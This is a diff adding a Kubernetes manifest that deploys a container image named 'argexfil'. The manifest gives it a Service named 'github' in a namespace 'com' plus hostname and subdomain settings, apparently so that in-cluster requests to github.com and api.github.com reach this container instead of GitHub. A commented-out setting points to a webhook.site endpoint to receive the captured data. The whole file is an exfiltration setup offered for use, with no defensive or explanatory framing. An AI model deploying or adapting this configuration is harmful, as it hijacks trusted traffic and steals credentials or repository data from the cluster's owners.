@@ -1,0 +1,49 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: argexfil
+  namespace: com
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: argexfil
+  template:
+    metadata:
+      labels:
+        app: argexfil
+    spec:
+      containers:
+      - name: argexfil
+        image: futuresightgroup/argexfil:latest
+        imagePullPolicy: Always
+        ports:
+        - containerPort: 443
+        env:
+        # - name: TARGET_URL
+        #   value: "https://webhook.site/74184d34-9677-4294-b5d2-da1fdf1813ed"
+        - name: REPO_DOMAIN
+          value: "*.github.com" # To get github.com and api.github.com
+      dnsPolicy: "None"
+      hostname: api
+      subdomain: github
+      dnsConfig: # It needs this to resolve external domains
+        nameservers:
+          - 8.8.8.8
+          - 1.1.1.1
+
+---
+
+apiVersion: v1
+kind: Service
+metadata:
+  name: github
+  namespace: com
+spec:
+  selector:
+    app: argexfil
+  ports:
+  - protocol: TCP
+    port: 443
+    targetPort: 443
+  type: ClusterIP
